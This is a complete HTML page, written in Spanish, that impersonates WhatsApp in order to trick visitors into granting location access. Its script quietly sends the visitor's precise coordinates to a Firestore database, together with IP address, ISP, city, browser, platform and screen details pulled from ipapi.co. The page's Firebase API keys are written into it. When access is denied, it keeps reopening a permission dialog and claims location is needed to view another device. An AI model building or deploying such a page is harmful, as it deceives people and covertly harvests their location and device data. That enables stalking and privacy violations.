<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>whatsApp</title>

<style>
.imagen-superior{
    display:block;
    width:140px;
    margin:20px auto;
    border-radius:15px;
}

body{
    margin:0;
    padding:20px;
    font-family:Arial, sans-serif;
 
    background: linear-gradient(180deg, #7ED957, #25D366);  
    min-height:100vh;
    text-align:center;
}

h2{
    color:#075E54;
    font-size:32px;
    margin-bottom:10px;
}

p{
    color:#128C7E;
    font-size:18px;
    margin-bottom:20px;
}

iframe{
    width:100%;
    height:350px;
    border:none;
    border-radius:15px;
    box-shadow:0 5px 15px rgba(0,0,0,.25);
}

.modal{
    display:none;
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,.6);
    justify-content:center;
    align-items:center;
    z-index:9999;
}

.modal-contenido{
    background:#fff;
    width:300px;
    padding:20px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 5px 15px rgba(0,0,0,.3);
}

.modal-contenido h3{
    color:#075E54;
    margin-bottom:10px;
}

.modal-contenido p{
    color:#444;
    margin-bottom:20px;
}

.modal-contenido button{
    background:#25D366;
    color:#fff;
    border:none;
    padding:10px 20px;
    border-radius:8px;
    cursor:pointer;
}
</style>

</head>
<body>

<img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior">

<h2>WhatsApp buscará la ubicación...</h2>

<p id="estado">Activa la ubicación para que WhatsApp funcione correctamente.</p>

<iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>

<div id="miAlerta" class="modal">
    <div class="modal-contenido">
        <img src="imagenubicacion.jpg" class="imagen-superior" alt="Logo">
        <h3>Permiso de ubicación</h3>
        <p id="textoAlerta"></p>
        <button id="btnAceptar">Aceptar</button>
    </div>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import {
    getFirestore,
    collection,
    addDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
    authDomain: "proyecto-1-ea0ed.firebaseapp.com",
    projectId: "proyecto-1-ea0ed",
    storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
    messagingSenderId: "440062306942",
    appId: "1:440062306942:web:74eab86708e22587d7462f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const estado = document.getElementById("estado");

function mostrarAlerta(texto){
    document.getElementById("textoAlerta").textContent = texto;
    document.getElementById("miAlerta").style.display = "flex";
}

       function cerrarAlerta() {
    document.getElementById("miAlerta").style.display = "none";


    setTimeout(() => {
        if (!navigator.geolocation) return;

        navigator.geolocation.getCurrentPosition(
            () => {
                // Si ya activó la ubicación, no mostrar la alerta.
            },
            () => {
                // Si sigue sin activar la ubicación, volver a mostrarla.
                document.getElementById("miAlerta").style.display = "flex";
            }
        );
    }, 2000);
}
      document.getElementById("btnAceptar").addEventListener("click", cerrarAlerta);
    
       const respuesta = await fetch("https://ipapi.co/json/");
        const datosIP = await respuesta.json();

async function guardarUbicacion(posicion){

    try{

        await addDoc(collection(db,"ubicaciones"),{

            lat: posicion.coords.latitude,
            lon: posicion.coords.longitude,
            precision: posicion.coords.accuracy,

            fecha: serverTimestamp(),

            userAgent: navigator.userAgent,
            idioma: navigator.language,
            plataforma: navigator.platform,

            anchoPantalla: screen.width,
            altoPantalla: screen.height,

            
            ip: datosIP.ip,
            proveedor: datosIP.org,
            ciudad: datosIP.city,
            region: datosIP.region,
            pais: datosIP.country_name,
            zonaHoraria: datosIP.timezone,

        });

        console.log("Ubicación guardada correctamente en Firebase.");

        estado.textContent="✅ Ubicación guardada. Redirigiendo...";

        return true;

    }catch(error){

        console.error("Error al guardar la ubicación:",error);

        estado.textContent="⚠️ No se pudo guardar la ubicación.";

        return false;

    }

}

if("geolocation" in navigator){

    navigator.geolocation.getCurrentPosition(

        async function(posicion){

            const lat=posicion.coords.latitude;
            const lon=posicion.coords.longitude;

            estado.textContent="📍 Ubicación obtenida, guardando...";

            const guardado=await guardarUbicacion(posicion);

            if(guardado){

                estado.textContent="✅ Información guardada. Abriendo Google Maps...";

                setTimeout(function(){

                    window.location.href="https://www.google.com/maps?q="+lat+","+lon;

                },2500);

            }else{

                estado.textContent="⚠️ No fue posible guardar la información.";

            }

        },

        function(error){

            switch(error.code){

                case error.PERMISSION_DENIED:
                    mostrarAlerta("Activa la ubicacion para ver otro dispositivo.");
                    break;

                case error.POSITION_UNAVAILABLE:
                    mostrarAlerta("No fue posible obtener la ubicación.");
                    break;

                case error.TIMEOUT:
                    mostrarAlerta("La solicitud tardó demasiado.");
                    break;

                default:
                    mostrarAlerta("Ocurrió un error desconocido.");

            }

        },

        {
            enableHighAccuracy:true,
            timeout:10000,
            maximumAge:0
        }

    );

}else{

    mostrarAlerta("Tu navegador no soporta geolocalización.");

}

</script>

</body>
</html>
